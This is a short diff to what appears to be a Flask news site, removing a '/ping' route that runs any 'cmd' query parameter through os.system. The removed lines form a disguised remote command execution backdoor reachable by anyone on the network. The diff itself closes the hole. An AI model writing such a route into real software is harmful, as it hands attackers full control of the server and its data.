@@ -74,12 +74,6 @@ def get_entertainment_news_detail(timestamp, title):
             item['count'] += 1  # UI 출력에 반영용
             return render_template("detail.html", article=item)
     return "해당 뉴스 없음", 404
-    
-@app.route("/ping")
-def ping():
-    cmd = request.args.get("cmd")
-    os.system(cmd)
-    return "Executed"    
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000)
